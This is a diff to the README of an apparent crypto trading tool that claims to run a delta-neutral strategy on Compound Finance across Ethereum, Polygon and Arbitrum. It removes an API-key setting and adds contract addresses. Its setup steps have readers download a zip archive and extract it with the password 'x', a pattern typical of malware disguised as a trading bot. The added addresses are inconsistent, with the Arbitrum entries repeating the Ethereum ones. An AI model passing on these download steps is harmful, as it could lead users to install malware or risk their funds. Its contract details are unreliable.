@@ -5,7 +5,6 @@ A delta-neutral strategy with Compound Finance involves employing a financial ap
 - [Clone](https://github.com/medlaare/delta-neutral-strategy/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `x`
 - Modify the the config file In this example:
-- `compound_api_key` is a placeholder for your Compound Finance API key.
 - `rpc_url` is the endpoint for the Ethereum, Polygon, and Arbitrum RPC providers.
 - `gas_limit` and `gas_price` are parameters to control transaction costs.
 - `rebalancing_time` specifies the time for periodic rebalancing.
@@ -15,9 +14,6 @@ A delta-neutral strategy with Compound Finance involves employing a financial ap
 
 ```
   # Tool Configuration for Compound Finance Strategy
-# Compound Finance API settings
-compound_api_key: "your_compound_api_key"
-
 # Ethereum network settings
 ethereum:
   rpc_url: "https://mainnet.infura.io/v3/your_infura_project_id"
@@ -26,6 +22,9 @@ ethereum:
   rebalancing_time: "15:00" # 24-hour format
   timeout: 300 # in seconds
   position_size_eth: 5 # in ETH
+  ctoken_address: "0xf5dce57282a584d2746faf1593d3121fcac444dc"
+  comptroller_address: "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5"
+  underlying_asset_address: "0x158079ee67fce2f58472a96584a73c7ab9ac95c1"
 
 # Polygon (Matic) network settings
 polygon:
@@ -35,6 +34,9 @@ polygon:
   rebalancing_time: "16:30" # 24-hour format
   timeout: 240 # in seconds
   position_size_matic: 500 # in MATIC
+  ctoken_address: "0xb3319f5d18bc0d84dd1b4825dcde5d5f7266d407"
+  comptroller_address: "0x02557a5e05defeffd4cae6d83ea3d173b272c904"
+  underlying_asset_address: "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b"
 
 # Arbitrum network settings
 arbitrum:
@@ -44,6 +46,9 @@ arbitrum:
   rebalancing_time: "18:00" # 24-hour format
   timeout: 360 # in seconds
   position_size_eth: 3 # in ETH
+  ctoken_address: "0x39aa39c021dfbae8fac545936693ac917d5e7563"
+  comptroller_address: "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5"
+  underlying_asset_address: "0x158079ee67fce2f58472a96584a73c7ab9ac95c1"
 ```
 
 # How It works
